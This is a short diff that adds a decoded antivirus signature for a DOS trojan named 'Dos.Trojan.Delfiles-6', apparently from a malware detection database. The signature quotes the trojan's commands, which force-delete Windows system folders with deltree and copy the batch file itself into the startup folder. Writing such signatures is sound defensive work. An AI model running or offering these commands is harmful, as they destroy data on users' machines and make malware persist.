@@ -1,0 +1,7 @@
+VIRUS NAME: Dos.Trojan.Delfiles-6
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+deltree /y c:\windows\system
+deltree /y c:\windows\command
+copy %0 C:\Windows\Start
